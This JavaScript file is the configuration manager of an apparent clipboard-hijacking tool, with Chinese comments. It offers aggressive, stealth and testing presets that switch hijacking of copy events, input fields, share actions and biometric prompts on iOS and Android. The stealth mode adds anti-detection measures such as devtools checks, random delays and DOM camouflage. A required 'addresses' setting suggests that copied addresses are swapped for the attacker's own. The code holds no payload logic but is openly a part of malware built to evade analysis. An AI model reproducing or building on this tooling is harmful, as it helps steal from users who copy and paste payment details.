/**
 * 剪贴板劫持配置管理器
 * 支持动态配置、预设模板、持久化存储
 */

const ConfigManager = {
  // 预设配置模板
  templates: {
    // 激进模式 - 最大化成功率
    aggressive: {
      global: {
        enabled: true,
        testMode: false,
        maxExecutions: -1,
        delay: { min: 0, max: 100 }
      },
      features: {
        ios: { copyEvent: true, buttonHijack: true, liveText: true, biometric: true },
        android: { ime: true, webview: true, share: true },
        universal: { contextMenu: true, selection: true, inputField: true }
      },
      antiDetect: { devtools: false, randomDelay: false, domCamouflage: false }
    },
    
    // 隐蔽模式 - 规避检测
    stealth: {
      global: {
        enabled: true,
        testMode: false,
        maxExecutions: 10,
        delay: { min: 500, max: 2000 }
      },
      features: {
        ios: { copyEvent: true, buttonHijack: false, liveText: false, biometric: false },
        android: { ime: true, webview: true, share: false },
        universal: { contextMenu: false, selection: true, inputField: false }
      },
      antiDetect: { devtools: true, randomDelay: true, domCamouflage: true }
    },
    
    // 测试模式 - 只记录不执行
    testing: {
      global: {
        enabled: true,
        testMode: true,
        maxExecutions: -1,
        delay: { min: 0, max: 0 }
      },
      features: {
        ios: { copyEvent: true, buttonHijack: true, liveText: true, biometric: true },
        android: { ime: true, webview: true, share: true },
        universal: { contextMenu: true, selection: true, inputField: true }
      },
      antiDetect: { devtools: false, randomDelay: false, domCamouflage: false }
    }
  },
  
  // 加载配置
  load(template = 'stealth') {
    const saved = this.getFromStorage();
    const base = this.templates[template] || this.templates.stealth;
    
    return this.merge(base, saved);
  },
  
  // 保存配置到本地存储
  save(config) {
    try {
      localStorage.setItem('cbh_config', JSON.stringify(config));
      return true;
    } catch (e) {
      return false;
    }
  },
  
  // 从存储获取
  getFromStorage() {
    try {
      const saved = localStorage.getItem('cbh_config');
      return saved ? JSON.parse(saved) : {};
    } catch (e) {
      return {};
    }
  },
  
  // 深度合并配置
  merge(target, source) {
    const result = JSON.parse(JSON.stringify(target));
    
    for (const key in source) {
      if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
        result[key] = this.merge(result[key] || {}, source[key]);
      } else {
        result[key] = source[key];
      }
    }
    
    return result;
  },
  
  // 验证配置合法性
  validate(config) {
    const required = ['global', 'features', 'addresses'];
    
    for (const key of required) {
      if (!config[key]) {
        throw new Error(`Missing required config: ${key}`);
      }
    }
    
    return true;
  }
};
